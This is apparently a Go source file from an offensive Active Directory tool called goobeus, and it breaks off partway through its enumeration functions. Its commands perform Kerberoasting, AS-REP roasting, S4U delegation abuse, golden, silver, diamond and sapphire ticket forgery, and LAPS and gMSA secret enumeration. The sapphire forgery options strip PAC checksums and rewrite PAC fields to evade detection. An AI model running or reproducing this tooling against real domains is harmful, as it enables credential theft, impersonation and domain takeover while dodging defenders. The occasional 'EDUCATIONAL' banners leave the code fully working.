package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"strings"
	"syscall"

	"golang.org/x/term"

	"github.com/goobeus/goobeus/pkg/adws"
	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/dcsync"
	"github.com/goobeus/goobeus/pkg/delegation"
	"github.com/goobeus/goobeus/pkg/forge"
	"github.com/goobeus/goobeus/pkg/pac"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// promptPassword securely prompts for a password without echoing to terminal.
func promptPassword(prompt string) (string, error) {
	fmt.Print(prompt)
	password, err := term.ReadPassword(int(syscall.Stdin))
	fmt.Println() // Print newline after password entry
	if err != nil {
		return "", fmt.Errorf("failed to read password: %w", err)
	}
	return string(password), nil
}

// ensureCredentials checks if credentials are available, prompting if needed.
// Returns an error only if credentials cannot be obtained.
func ensureCredentials() error {
	// If we already have credentials, nothing to do
	if flags.password != "" || flags.ntHash != "" || flags.aes256 != "" {
		return nil
	}

	// If no username, we can't prompt (don't know who to auth as)
	if flags.username == "" {
		return nil // Let the command handle this error
	}

	// Prompt for password
	password, err := promptPassword(fmt.Sprintf("Password for %s: ", flags.username))
	if err != nil {
		return err
	}
	if password == "" {
		return fmt.Errorf("password cannot be empty")
	}
	flags.password = password
	return nil
}

// cmdAskTGT handles the asktgt command.
func cmdAskTGT(args []string) error {
	if flags.domain == "" {
		return fmt.Errorf("domain is required (-d)")
	}
	if flags.username == "" {
		return fmt.Errorf("username is required (-u)")
	}

	// Prompt for password if no credentials provided
	if err := ensureCredentials(); err != nil {
		return err
	}

	req := &client.TGTRequest{
		Domain:   flags.domain,
		Username: flags.username,
		Password: flags.password,
		KDC:      flags.kdc,
	}

	if flags.ntHash != "" {
		req.NTHash = hexDecode(flags.ntHash)
	}
	if flags.aes256 != "" {
		req.AES256 = hexDecode(flags.aes256)
	}

	result, err := client.AskTGT(req)
	if err != nil {
		return err
	}

	return outputTicket(result.Kirbi)
}

// cmdAskTGS handles the asktgs command (Kerberoasting).
func cmdAskTGS(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("SPN required (e.g., MSSQLSvc/sql01:1433)")
	}

	tgt, sessionKey, err := loadTicket()
	if err != nil {
		return err
	}

	for _, spn := range args {
		req := &client.TGSRequest{
			TGT:        tgt,
			SessionKey: sessionKey,
			Service:    spn,
			Domain:     flags.domain,
			KDC:        flags.kdc,
		}

		result, err := client.AskTGS(req)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] %s: %v\n", spn, err)
			continue
		}

		// Print Kerberoast hash
		if result.Hash != "" {
			fmt.Println(result.Hash)
		}

		if flags.outfile != "" {
			outputTicket(result.Kirbi)
		}
	}

	return nil
}

// cmdS4U handles S4U delegation attacks.
func cmdS4U(args []string) error {
	// Filter out flag-like args that were meant for the global parser
	// but ended up here (cli library stops parsing at first positional arg).
	var positional []string
	for i := 0; i < len(args); i++ {
		if (args[i] == "-o" || args[i] == "--out") && i+1 < len(args) {
			flags.outfile = args[i+1]
			i++ // skip the value
		} else if !strings.HasPrefix(args[i], "-") {
			positional = append(positional, args[i])
		}
	}

	if len(positional) == 0 {
		return fmt.Errorf("target user required")
	}

	tgt, sessionKey, err := loadTicket()
	if err != nil {
		return err
	}

	targetUser := positional[0]
	targetSPN := ""
	if len(positional) > 1 {
		targetSPN = positional[1]
	}

	// S4U2Self
	// ServiceName must be our own username for U2U — we're requesting
	// a ticket TO OURSELVES on behalf of targetUser. The KDC encrypts
	// the result with our TGT session key (ENC-TKT-IN-SKEY).
	serviceName := flags.username
	if serviceName == "" && tgt.CredInfo != nil && len(tgt.CredInfo.TicketInfo) > 0 {
		if names := tgt.CredInfo.TicketInfo[0].PName.NameString; len(names) > 0 {
			serviceName = names[0]
		}
	}

	s4uSelfReq := &client.S4U2SelfRequest{
		TGT:         tgt,
		SessionKey:  sessionKey,
		TargetUser:  targetUser,
		ServiceName: serviceName,
		Domain:      flags.domain,
		KDC:         flags.kdc,
	}

	s4uSelfResult, err := client.S4U2Self(s4uSelfReq)
	if err != nil {
		return fmt.Errorf("S4U2Self failed: %w", err)
	}

	fmt.Printf("[+] S4U2Self ticket for %s (forwardable: %v)\n", targetUser, s4uSelfResult.Forwardable)

	// Decrypt the S4U2Self ticket and show the PAC.
	// The ticket is encrypted with the TGT session key (U2U: ENC-TKT-IN-SKEY).
	etype := 18 // AES256
	if len(sessionKey) == 16 {
		etype = 23 // RC4
	}
	pacData, err := decryptTicketAndExtractPAC(s4uSelfResult.Kirbi, sessionKey, etype)
	if err != nil {
		fmt.Printf("[!] PAC extraction failed: %v\n", err)
	} else if len(pacData) > 0 {
		decodedPAC, err := pac.DecodePAC(pacData)
		if err != nil {
			fmt.Printf("[!] PAC decode failed: %v\n", err)
		} else {
			fmt.Println()
			fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
			fmt.Printf("║ S4U2Self+U2U PAC for: %-55s ║\n", targetUser)
			fmt.Println("╠══════════════════════════════════════════════════════════════════════════════╣")
			fmt.Printf("  User SID:         %s\n", decodedPAC.UserSID)
			fmt.Printf("  Domain Admin:     %v\n", decodedPAC.IsDomainAdmin)
			fmt.Printf("  Enterprise Admin: %v\n", decodedPAC.IsEnterpriseAdmin)
			fmt.Printf("  Builtin Admin:    %v\n", decodedPAC.IsBuiltinAdmin)
			fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
			fmt.Printf("  Groups (%d):\n", len(decodedPAC.Groups))
			for _, g := range decodedPAC.Groups {
				fmt.Printf("    - %s\n", g)
			}
			if len(decodedPAC.ExtraSIDs) > 0 {
				fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
				fmt.Printf("  Extra SIDs (%d):\n", len(decodedPAC.ExtraSIDs))
				for _, s := range decodedPAC.ExtraSIDs {
					label := ""
					if s == "S-1-18-1" {
						label = " ← AUTHENTICATION AUTHORITY (normal AS-REQ)"
					} else if s == "S-1-18-2" {
						label = " ← SERVICE ASSERTED (S4U2Self!)"
					}
					fmt.Printf("    - %s%s\n", s, label)
				}
			}
			fmt.Println("  ────────────────────────────────────────────────────────────────────────────")
			fmt.Printf("  UserFlags: 0x%X\n", decodedPAC.UserFlags)
			if decodedPAC.HasServiceAssertedIdentity {
				fmt.Println("  S-1-18-2 PRESENT — confirms S4U2Self+U2U was used")
			} else if decodedPAC.HasAuthAssertedIdentity {
				fmt.Println("  S-1-18-1 present — normal authentication (not S4U2Self)")
			}
			fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
		}
	}

	if targetSPN == "" {
		return outputTicket(s4uSelfResult.Kirbi)
	}

	// S4U2Proxy
	// Don't gate on forwardable — with RBCD the KDC accepts non-forwardable
	// evidence tickets. Let the KDC decide and return an error if it rejects.
	if !s4uSelfResult.Forwardable {
		fmt.Println("[!] S4U2Self ticket is NOT forwardable (no TRUSTED_TO_AUTH_FOR_DELEGATION)")
		fmt.Println("[*] Attempting S4U2Proxy anyway (works with RBCD)...")
	}

	s4uProxyReq := &client.S4U2ProxyRequest{
		TGT:            tgt,
		SessionKey:     sessionKey,
		S4U2SelfTicket: s4uSelfResult.Kirbi,
		TargetSPN:      targetSPN,
		Domain:         flags.domain,
		KDC:            flags.kdc,
	}

	s4uProxyResult, err := client.S4U2Proxy(s4uProxyReq)
	if err != nil {
		return fmt.Errorf("S4U2Proxy failed: %w", err)
	}

	fmt.Printf("[+] S4U2Proxy ticket for %s to %s\n", targetUser, targetSPN)
	return outputTicket(s4uProxyResult.Kirbi)
}

// cmdKerberoast handles the kerberoast command.
func cmdKerberoast(args []string) error {
	// This would integrate with ADWS enumeration to find SPNs
	// For now, require SPNs as args
	return cmdAskTGS(args)
}

// cmdASREPRoast handles the asreproast command.
func cmdASREPRoast(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("users required")
	}
	if flags.domain == "" {
		return fmt.Errorf("domain required (-d)")
	}

	results, err := roastASREP(context.Background(), args, flags.domain, flags.kdc)
	if err != nil {
		return err
	}

	for _, r := range results {
		if r.Hash != "" {
			fmt.Println(r.Hash)
		} else if r.Error != "" {
			if flags.verbose {
				fmt.Fprintf(os.Stderr, "[!] %s: %s\n", r.Username, r.Error)
			}
		}
	}

	return nil
}

// cmdGolden handles golden ticket forging.
func cmdGolden(args []string) error {
	fs := flag.NewFlagSet("golden", flag.ExitOnError)
	var domainSID, krbtgtHash, user string
	var userID int
	var groups string

	fs.StringVar(&domainSID, "sid", "", "Domain SID (S-1-5-21-...)")
	fs.StringVar(&krbtgtHash, "krbtgt", "", "krbtgt key (hex)")
	fs.StringVar(&user, "user", "Administrator", "Username to forge")
	fs.IntVar(&userID, "id", 500, "User RID")
	fs.StringVar(&groups, "groups", "513,512,520,518,519", "Group RIDs (comma-separated)")
	fs.Parse(args)

	if domainSID == "" {
		return fmt.Errorf("--sid (domain SID) is required")
	}
	if krbtgtHash == "" {
		return fmt.Errorf("--krbtgt (krbtgt hash) is required")
	}
	if flags.domain == "" {
		return fmt.Errorf("-d (domain) is required")
	}

	key := hexDecode(krbtgtHash)
	groupRIDs := parseGroups(groups)

	req := &forge.GoldenTicketRequest{
		Username:   user,
		UserID:     uint32(userID),
		Domain:     flags.domain,
		DomainSID:  domainSID,
		Groups:     groupRIDs,
		KrbtgtKey:  key,
		KrbtgtKvno: 2,
	}

	fmt.Println("[*] Forging Golden Ticket...")
	result, err := forge.ForgeGoldenTicket(req)
	if err != nil {
		return fmt.Errorf("golden ticket forge failed: %w", err)
	}

	fmt.Printf("[+] Golden Ticket forged for %s@%s\n", user, flags.domain)
	fmt.Printf("[+] Groups: %v\n", groupRIDs)

	return outputTicket(result.Kirbi)
}

// cmdSilver handles silver ticket forging.
func cmdSilver(args []string) error {
	fs := flag.NewFlagSet("silver", flag.ExitOnError)
	var domainSID, serviceHash, spn, user string
	var userID int
	var groups string

	fs.StringVar(&domainSID, "sid", "", "Domain SID (S-1-5-21-...)")
	fs.StringVar(&serviceHash, "hash", "", "Service account key (hex)")
	fs.StringVar(&spn, "spn", "", "Target SPN (e.g., cifs/server.domain.com)")
	fs.StringVar(&user, "user", "Administrator", "Username to forge")
	fs.IntVar(&userID, "id", 500, "User RID")
	fs.StringVar(&groups, "groups", "513,512,520,518,519", "Group RIDs (comma-separated)")
	fs.Parse(args)

	if domainSID == "" {
		return fmt.Errorf("--sid (domain SID) is required")
	}
	if serviceHash == "" {
		return fmt.Errorf("--hash (service hash) is required")
	}
	if spn == "" {
		return fmt.Errorf("--spn (service SPN) is required")
	}
	if flags.domain == "" {
		return fmt.Errorf("-d (domain) is required")
	}

	key := hexDecode(serviceHash)
	groupRIDs := parseGroups(groups)

	req := &forge.SilverTicketRequest{
		Username:    user,
		UserID:      uint32(userID),
		Domain:      flags.domain,
		DomainSID:   domainSID,
		ServiceSPN:  spn,
		Groups:      groupRIDs,
		ServiceKey:  key,
		ServiceKvno: 2,
	}

	fmt.Println("[*] Forging Silver Ticket...")
	result, err := forge.ForgeSilverTicket(req)
	if err != nil {
		return fmt.Errorf("silver ticket forge failed: %w", err)
	}

	fmt.Printf("[+] Silver Ticket forged for %s to %s\n", user, spn)
	fmt.Printf("[+] Groups: %v\n", groupRIDs)

	return outputTicket(result.Kirbi)
}

// cmdDiamond handles diamond ticket forging.
func cmdDiamond(args []string) error {
	fs := flag.NewFlagSet("diamond", flag.ExitOnError)
	var domainSID, krbtgtHash string
	var groups string

	fs.StringVar(&domainSID, "sid", "", "Domain SID (S-1-5-21-...)")
	fs.StringVar(&krbtgtHash, "krbtgt", "", "krbtgt key (hex)")
	fs.StringVar(&groups, "groups", "513,512,519", "Group RIDs to add")
	fs.Parse(args)

	if domainSID == "" {
		return fmt.Errorf("--sid (domain SID) is required")
	}
	if krbtgtHash == "" {
		return fmt.Errorf("--krbtgt (krbtgt hash) is required")
	}
	if flags.domain == "" || flags.username == "" {
		return fmt.Errorf("-d (domain) and -u (username) required for initial TGT")
	}
	if flags.password == "" && flags.ntHash == "" && flags.aes256 == "" {
		return fmt.Errorf("credentials required (-p, --rc4, or --aes256)")
	}

	key := hexDecode(krbtgtHash)
	groupRIDs := parseGroups(groups)

	req := &forge.DiamondTicketRequest{
		Username:   flags.username,
		Password:   flags.password,
		NTHash:     hexDecode(flags.ntHash),
		AES256:     hexDecode(flags.aes256),
		Domain:     flags.domain,
		KrbtgtKey:  key,
		KrbtgtKvno: 2,
		Groups:     groupRIDs,
		DomainSID:  domainSID,
		KDC:        flags.kdc,
	}

	fmt.Println("[*] Forging Diamond Ticket...")
	fmt.Println("[*] Step 1: Requesting legitimate TGT...")
	result, err := forge.ForgeDiamondTicket(context.Background(), req)
	if err != nil {
		return fmt.Errorf("diamond ticket forge failed: %w", err)
	}

	fmt.Printf("[+] Diamond Ticket forged with additional groups: %v\n", groupRIDs)

	return outputTicket(result.Kirbi)
}

// cmdSapphire handles sapphire ticket forging.
func cmdSapphire(args []string) error {
	fs := flag.NewFlagSet("sapphire", flag.ExitOnError)
	var domainSID, impersonate, krbtgtHash, krbtgtAES, outfile string
	var userID uint
	var stripLogonFlags, stripPACAttributes, stripFullChecksum, stripTicketChecksum, syncClientInfoTime, stripProxiable, stripExtraGroups, clearExtraSids, kinitRenewTill bool

	fs.StringVar(&domainSID, "domain-sid", "", "Domain SID (S-1-5-21-...)")
	fs.StringVar(&impersonate, "impersonate", "", "User to impersonate (e.g., Administrator)")
	fs.StringVar(&krbtgtHash, "nthash", "", "krbtgt NT hash (for signing)")
	fs.StringVar(&krbtgtAES, "aeskey", "", "krbtgt AES256 key (for signing)")
	fs.UintVar(&userID, "user-id", 0, "User ID for PAC_REQUESTOR (KB5008380)")
	fs.StringVar(&outfile, "o", "", "Output file (.kirbi or .ccache)")
	fs.StringVar(&outfile, "out", "", "Output file (.kirbi or .ccache)")
	fs.BoolVar(&stripLogonFlags, "strip-logon-flags", false, "Clear LOGON_RESOURCE_GROUPS (0x200) bit in PAC UserFlags (second S4U2Self watermark)")
	fs.BoolVar(&stripPACAttributes, "strip-pac-attributes", false, "Rewrite PAC_ATTRIBUTES_INFO flags 0x2 (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) → 0x1 (PAC_WAS_REQUESTED, AS-REQ)")
	fs.BoolVar(&stripFullChecksum, "strip-full-checksum", false, "Remove PAC_FULL_CHECKSUM buffer (type 19, KB5020805 anti-sapphire measure)")
	fs.BoolVar(&stripTicketChecksum, "strip-ticket-checksum", false, "Remove PAC_TICKET_CHECKSUM buffer (type 16, KB5008380 anti-transplant HMAC). WARNING: may fail on strict-enforcement DCs.")
	fs.BoolVar(&syncClientInfoTime, "sync-client-info-time", false, "Rewrite CLIENT_INFO.ClientId FILETIME to match forged TGT AuthTime (matches legit TGT invariant)")
	fs.BoolVar(&stripProxiable, "strip-proxiable", false, "Clear PROXIABLE bit in EncTicketPart.Flags (matches KDC behavior for protected/privileged accounts)")
	fs.BoolVar(&stripExtraGroups, "strip-extra-groups", false, "Substitute RID 572 (Denied RODC Password Replication Group) → RID 513 (Domain Users) in LOGON_INFO — removes S4U2Self-transitive group IOC while preserving PAC validity")
	fs.BoolVar(&clearExtraSids, "clear-extra-sids", false, "Set SidCount=0 and ExtraSids=NULL in LOGON_INFO (proper NDR-level removal — matches legit kinit baseline of empty ExtraSids)")
	fs.BoolVar(&kinitRenewTill, "kinit-renew-till", false, "Force RenewTill = AuthTime + 7 days (matches MIT kinit default; otherwise inherits attacker's +24h from AS-REP)")
	fs.Parse(args)

	// Override global outfile if local one specified
	if outfile != "" {
		flags.outfile = outfile
	}

	if impersonate == "" {
		return fmt.Errorf("--impersonate (user to steal PAC from) is required")
	}
	if flags.domain == "" {
		return fmt.Errorf("-d (domain) is required")
	}
	if flags.username == "" && flags.ticket == "" {
		return fmt.Errorf("-u (username) or -t (TGT) is required")
	}

	// Determine krbtgt key
	var krbtgtNTHash, krbtgtAES256 []byte
	if krbtgtHash != "" {
		hash, err := hex.DecodeString(krbtgtHash)
		if err != nil {
			return fmt.Errorf("invalid krbtgt hash: %w", err)
		}
		krbtgtNTHash = hash
	}
	if krbtgtAES != "" {
		key, err := hex.DecodeString(krbtgtAES)
		if err != nil {
			return fmt.Errorf("invalid krbtgt aes key: %w", err)
		}
		krbtgtAES256 = key
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  SAPPHIRE TICKET FORGERY")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Domain:      %s\n", flags.domain)
	fmt.Printf("  User:        %s\n", flags.username)
	fmt.Printf("  Impersonate: %s\n", impersonate)
	fmt.Println()
	fmt.Println("  EDUCATIONAL: Sapphire Ticket Attack")
	fmt.Println("  - Request legit TGT for low-priv user")
	fmt.Println("  - S4U2self+U2U to get target user's REAL PAC")
	fmt.Println("  - Replace our PAC with theirs")
	fmt.Println("  - Result: TGT with another user's privileges!")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println()

	// Use existing TGT if provided, otherwise ensure credentials first
	var tgt *ticket.Kirbi
	var sessionKey []byte
	if flags.ticket != "" {
		kirbi, err := ticket.LoadKirbi(flags.ticket)
		if err != nil {
			return fmt.Errorf("failed to load TGT: %w", err)
		}
		tgt = kirbi
		if kirbi.SessionKey() != nil {
			sessionKey = kirbi.SessionKey().KeyValue
		}
	} else {
		// Prompt for password if no TGT and no credentials provided
		if err := ensureCredentials(); err != nil {
			return err
		}
	}

	req := &forge.SapphireTicketRequest{
		Domain:         flags.domain,
		DomainSID:      domainSID,
		Username:       flags.username,
		Password:       flags.password,
		Impersonate:    impersonate,
		UserID:         uint32(userID),
		KrbtgtNTHash:   krbtgtNTHash,
		KrbtgtAES256:   krbtgtAES256,
		KDC:                 flags.kdc,
		TGT:                 tgt,
		SessionKey:          sessionKey,
		StripLogonFlags:     stripLogonFlags,
		StripPACAttributes:  stripPACAttributes,
		StripFullChecksum:   stripFullChecksum,
		StripTicketChecksum: stripTicketChecksum,
		SyncClientInfoTime:  syncClientInfoTime,
		StripProxiable:      stripProxiable,
		StripExtraGroups:    stripExtraGroups,
		ClearExtraSids:      clearExtraSids,
		KinitRenewTill:      kinitRenewTill,
	}

	result, err := forge.ForgeSapphireTicket(context.Background(), req)
	if err != nil {
		return fmt.Errorf("sapphire ticket forge failed: %w", err)
	}

	fmt.Println()
	fmt.Println("[+] Sapphire Ticket created!")
	fmt.Printf("  Original User:  %s\n", result.OriginalUser)
	fmt.Printf("  Impersonating:  %s\n", result.ImpersonatedAs)
	fmt.Println()

	return outputTicket(result.Kirbi)
}

// parseGroups parses comma-separated group RIDs.
func parseGroups(s string) []uint32 {
	var groups []uint32
	for _, part := range strings.Split(s, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		var rid uint32
		fmt.Sscanf(part, "%d", &rid)
		if rid > 0 {
			groups = append(groups, rid)
		}
	}
	return groups
}

// cmdHash computes Kerberos keys from passwords.
func cmdHash(args []string) error {
	fs := flag.NewFlagSet("hash", flag.ExitOnError)
	var user, domain string
	fs.StringVar(&user, "user", "", "Username (for AES salt)")
	fs.StringVar(&domain, "domain", "", "Domain (for AES salt)")
	fs.Parse(args)

	// Password from -p flag or remaining args
	password := flags.password
	if password == "" && len(fs.Args()) > 0 {
		password = fs.Args()[0]
	}
	if password == "" {
		return fmt.Errorf("password required (-p or as argument)")
	}

	// Get user/domain for AES salt
	if user == "" {
		user = flags.username
	}
	if domain == "" {
		domain = flags.domain
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  KERBEROS KEY GENERATION")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Password:   %s\n", password)
	fmt.Println()

	// NTLM Hash
	ntlmHash := crypto.NTLMHash(password)
	fmt.Println("  RC4-HMAC (NTLM Hash):")
	fmt.Printf("    %s\n", hex.EncodeToString(ntlmHash))
	fmt.Println()

	// AES Keys (need user/domain for salt)
	if user != "" && domain != "" {
		salt := crypto.BuildAESSalt(domain, user)
		fmt.Printf("  AES Salt:   %s\n", salt)
		fmt.Println()

		aes128 := crypto.AES128Key(password, salt)
		fmt.Println("  AES128-CTS-HMAC-SHA1-96:")
		fmt.Printf("    %s\n", hex.EncodeToString(aes128))
		fmt.Println()

		aes256 := crypto.AES256Key(password, salt)
		fmt.Println("  AES256-CTS-HMAC-SHA1-96:")
		fmt.Printf("    %s\n", hex.EncodeToString(aes256))
	} else {
		fmt.Println("  [!] Specify --user and --domain for AES key derivation")
	}

	fmt.Println()
	fmt.Println("───────────────────────────────────────────────────────────────")
	fmt.Println("EDUCATIONAL NOTES:")
	fmt.Println("  • RC4 key = NTLM hash = MD4(UTF16LE(password))")
	fmt.Println("  • AES key = PBKDF2(password, salt, 4096, keySize)")
	fmt.Println("  • Salt = uppercase(REALM) + principal")
	fmt.Println("  • RC4 enables pass-the-hash; AES keys are password-specific")
	fmt.Println("═══════════════════════════════════════════════════════════════")

	return nil
}

// cmdChangepw changes a user's password via Kerberos kpasswd.
func cmdChangepw(args []string) error {
	fs := flag.NewFlagSet("changepw", flag.ExitOnError)
	var newPassword, targetUser string
	fs.StringVar(&newPassword, "new", "", "New password")
	fs.StringVar(&newPassword, "newpw", "", "New password")
	fs.StringVar(&targetUser, "target", "", "Target user (for admin reset)")
	fs.Parse(args)

	if flags.domain == "" {
		return fmt.Errorf("domain required (-d)")
	}
	if flags.username == "" {
		return fmt.Errorf("username required (-u)")
	}
	if flags.password == "" {
		return fmt.Errorf("current password required (-p)")
	}
	if newPassword == "" {
		return fmt.Errorf("new password required (--new/--newpw)")
	}

	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Println("  KERBEROS PASSWORD CHANGE")
	fmt.Println("═══════════════════════════════════════════════════════════════")
	fmt.Printf("  Domain:   %s\n", flags.domain)
	fmt.Printf("  User:     %s\n", flags.username)
	if targetUser != "" {
		fmt.Printf("  Target:   %s (admin password reset)\n", targetUser)
	}
	fmt.Println()

	ctx := context.Background()
	req := &client.ChangePasswordRequest{
		Username:        flags.username,
		Domain:          flags.domain,
		CurrentPassword: flags.password,
		NewPassword:     newPassword,
		TargetUser:      targetUser,
		KDC:             flags.kdc,
	}

	fmt.Println("[*] Authenticating with current password...")
	fmt.Println("[*] Sending password change request to kpasswd (port 464)...")

	result, err := client.ChangePassword(ctx, req)
	if err != nil {
		return fmt.Errorf("password change failed: %w", err)
	}

	if result.Success {
		fmt.Println()
		fmt.Println("[+] PASSWORD CHANGED SUCCESSFULLY!")
		fmt.Println()
		fmt.Println("───────────────────────────────────────────────────────────────")
		fmt.Println("EDUCATIONAL: Kerberos Password Change")
		fmt.Println("  Uses kpasswd protocol (RFC 3244, port 464)")
		fmt.Println("  1. AP-REQ authenticates with current TGT")
		fmt.Println("  2. KRB-PRIV contains encrypted new password")
		fmt.Println("  3. KDC updates password in AD")
		fmt.Println("───────────────────────────────────────────────────────────────")
	} else {
		fmt.Printf("[!] Password change failed: %s\n", result.Message)
	}

	return nil
}

// cmdDescribe describes a ticket.
func cmdDescribe(args []string) error {
	// Parse flags
	fs := flag.NewFlagSet("describe", flag.ExitOnError)
	var keyStr, ticketPath string
	var checkAnomalies bool
	fs.StringVar(&keyStr, "k", "", "Krbtgt key (AES256/AES128/RC4 hex) to decrypt ticket")
	fs.StringVar(&keyStr, "key", "", "Krbtgt key (AES256/AES128/RC4 hex) to decrypt ticket")
	fs.StringVar(&ticketPath, "t", "", "Path to ticket file (.kirbi)")
	fs.StringVar(&ticketPath, "ticket", "", "Path to ticket file (.kirbi)")
	fs.BoolVar(&checkAnomalies, "anomaly", false, "Run anomaly detection to check for potential SSPI/EDR issues")
	fs.BoolVar(&checkAnomalies, "a", false, "Run anomaly detection (shorthand)")
	fs.Parse(args)

	// Get remaining args after flags
	remainingArgs := fs.Args()

	// Accept ticket from: local flag, global flag, or positional arg
	if ticketPath == "" {
		ticketPath = flags.ticket
	}
	if ticketPath == "" && len(remainingArgs) > 0 {
		ticketPath = remainingArgs[0]
	}
	if ticketPath == "" {
		return fmt.Errorf("ticket path required (-t or as argument)")
	}

	// Auto-detect file format (kirbi vs ccache)
	data, err := os.ReadFile(ticketPath)
	if err != nil {
		return fmt.Errorf("failed to read ticket file: %w", err)
	}

	var kirbi *ticket.Kirbi
	if len(data) > 2 && (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04)) {
		// CCache format (version 0x0503 or 0x0504)
		fmt.Println("[*] Detected ccache format, converting to kirbi...")
		cc, err := ticket.LoadCCache(ticketPath)
		if err != nil {
			return fmt.Errorf("failed to parse ccache: %w", err)
		}
		kirbi, err = cc.ToKirbi()
		if err != nil {
			return fmt.Errorf("failed to convert ccache to kirbi: %w", err)
		}
	} else {
		// Kirbi format
		kirbi, err = ticket.LoadKirbi(ticketPath)
		if err != nil {
			return err
		}
	}

	// If key provided, set it for decryption
	var keyBytes []byte
	var keyType int
	if keyStr != "" {
		keyBytes, err = hex.DecodeString(keyStr)
		if err != nil {
			return fmt.Errorf("invalid key hex: %w", err)
		}
		kirbi.DecryptKey = keyBytes
		// Determine key type from length
		switch len(keyBytes) {
		case 16:
			keyType = 17 // AES128
			kirbi.DecryptKeyType = keyType
		case 32:
			keyType = 18 // AES256
			kirbi.DecryptKeyType = keyType
		default:
			keyType = 23 // RC4/NTLM
			kirbi.DecryptKeyType = keyType
		}
		fmt.Printf("[*] Using provided key for decryption (%d bytes, etype %d)\n", len(keyBytes), keyType)
	}

	// Use ticket viewer
	view := ticket.ViewTicket(kirbi, ticket.ViewOptions{Verbose: flags.verbose, DecryptKey: kirbi.DecryptKey})
	fmt.Println(view.String())

	// Run anomaly detection if requested
	if checkAnomalies {
		checks := ticket.CheckForAnomalies(kirbi)
		fmt.Println(ticket.FormatAnomalyChecks(checks))
	}

	// If key provided, try to decrypt ticket and decode PAC
	if len(keyBytes) > 0 && kirbi.Ticket() != nil {
		fmt.Println("[*] Attempting to decrypt ticket and decode PAC...")
		pacData, err := decryptTicketAndExtractPAC(kirbi, keyBytes, keyType)
		if err != nil {
			fmt.Printf("[!] PAC extraction failed: %v\n", err)
		} else if len(pacData) > 0 {
			// Decode PAC and show group memberships
			decoded, err := decodePACForDisplay(pacData)
			if err != nil {
				fmt.Printf("[!] PAC decode failed: %v\n", err)
			} else {
				fmt.Println(decoded)
			}
		}
	}

	return nil
}

// cmdEnumerate handles ADWS enumeration.
func cmdEnumerate(args []string) error {
	// Mode is the first positional argument (e.g., "bloodhound", "groups", "laps")
	mode := ""
	if len(args) > 0 {
		mode = strings.ToLower(args[0])
	}

	// Domain comes from -d flag or auto-detect from session
	if flags.domain == "" {
		domain, err := getSessionDomain()
		if err == nil && domain != "" {
			flags.domain = domain
			fmt.Printf("[*] Auto-detected domain from session: %s\n", flags.domain)
		}
	}

	// Determine auth method
	authMethod := "current Windows session (TGT from cache)"
	if flags.username != "" {
		authMethod = fmt.Sprintf("explicit credentials (%s)", flags.username)
	}

	if mode != "" && mode != "help" {
		fmt.Printf("[*] Enumerating %s via ADWS (port 9389)\n", flags.domain)
	}
	fmt.Printf("[*] Authentication: %s\n", authMethod)
	fmt.Println()

	switch mode {
	case "spn", "spns", "kerberoast":
		fmt.Println("[*] Finding kerberoastable accounts...")
		return runSPNEnumeration(flags.domain, flags.kdc)
	case "asrep":
		fmt.Println("[*] Finding AS-REP roastable accounts...")
		return runASREPEnumeration(flags.domain, flags.kdc)
	case "delegation":
		fmt.Println("[*] Finding delegation configurations...")
		return runDelegationEnumeration(flags.domain, flags.kdc)
	case "collect", "bloodhound":
		fmt.Println("[*] Running BloodHound collection...")
		return runBloodHoundCollection(flags.domain, flags.kdc)
	case "laps":
		fmt.Println("[*] Finding LAPS passwords...")
		return runLAPSEnumeration(flags.domain, flags.kdc)
	case "gmsa":
		fmt.Println("[*] Finding gMSA accounts...")
		return runGMSAEnumeration(flags.domain, flags.kdc)
	case "groups":
		fmt.Println("[*] Finding privileged group members...")
		return runGroupEnumeration(flags.domain, flags.kdc)
	case "computers":
		fmt.Println("[*] Finding computers...")
		return runComputerEnumeration(flags.domain, flags.kdc)
	default:
		fmt.Println("[*] Available enumeration modes:")
		fmt.Println("    bloodhound  - BloodHound collection (ZIP with JSON)")
		fmt.Println("    spn         - Kerberoastable accounts")
		fmt.Println("    asrep       - AS-REP roastable accounts")
		fmt.Println("    delegation  - Delegation configurations")
		fmt.Println("    laps        - LAPS passwords")
		fmt.Println("    gmsa        - gMSA accounts")
		fmt.Println("    groups      - Privileged group members")
		fmt.Println("    computers   - All computers")
		fmt.Println()
		fmt.Println("Example: goobeus enumerate bloodhound -d DOMAIN.COM")
	}

	return nil
}

// ADWS Enumeration Functions

func runSPNEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
	ctx := context.Background()

	results, err := client.FindKerberoastable(ctx)
	if err != nil {
		return fmt.Errorf("SPN enumeration failed: %w", err)
	}

	fmt.Printf("[+] Found %d kerberoastable accounts\n\n", len(results))
	for _, r := range results {
		fmt.Printf("  %-20s %s\n", r.SAMAccountName, r.SPNs[0])
		for _, spn := range r.SPNs[1:] {
			fmt.Printf("  %-20s %s\n", "", spn)
		}
	}
	return nil
}

func runASREPEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
	ctx := context.Background()

	results, err := client.FindASREPRoastable(ctx)
	if err != nil {
		return fmt.Errorf("AS-REP enumeration failed: %w", err)
	}

	fmt.Printf("[+] Found %d AS-REP roastable accounts\n\n", len(results))
	for _, r := range results {
		fmt.Printf("  %s\n", r.SAMAccountName)
	}
	return nil
}

func runDelegationEnumeration(domain, dc string) error {
	client := adws.NewClient(getDC(domain, dc), adws.WithTLS(true))
